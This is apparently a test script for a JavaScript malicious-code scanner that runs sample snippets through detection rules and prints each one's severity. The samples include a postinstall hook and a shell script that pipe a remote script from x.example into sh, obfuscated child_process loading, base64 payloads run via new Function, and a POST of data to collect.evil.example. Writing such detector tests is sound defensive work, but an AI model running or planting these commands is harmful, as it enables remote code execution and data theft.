import { scanContent } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/index.js';
import { grade } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/report.js';
import { maskComments } from '/Users/timurmonasypov/Documents/GitHub/dsh-bridge/tools/scan/dist/rules/index.js';

// D-desync direction: print masked output
const dsrc = 'const re = /[\'"]/;\neval(runsShell);';
console.log('=== masked D1:');
console.log(JSON.stringify(maskComments(dsrc)));

const show = (label, src, path='lib/app.js') => {
  const f = scanContent(src, path);
  console.log('=== ' + label);
  console.log(JSON.stringify(f.map(x => ({id:x.id, sev:x.severity}))));
};

// decode into variable first, then Function(var)
show('L1 staged decode via var', 'const p = a + b;\nconst s = Buffer.from(p, "base64").toString("utf8");\nnew Function(s)();');
// getBuiltinModule with split name
show('L2 getBuiltinModule split', 'const m = process.getBuiltinModule("child_" + "process");\nm.execSync(cmd);');
// undici / globalThis.request style
show('L3 globalThis.request', 'globalThis.request("https://collect.evil.example/x", { method:"POST", body: blob });');
// node --eval postinstall gate check severities
show('J2 postinstall node -e', '{ "scripts": { "postinstall": "node -e \\"require(\'child_process\').execSync(\'curl https://x.example/i.sh | sh\')\\"" } }', 'package.json');
// benign top-level await fetch in docs example? no. Test .sh scanning behavior
show('M1 shell script curl', 'curl -s https://x.example/i.sh | bash\n', 'scripts/setup.sh');
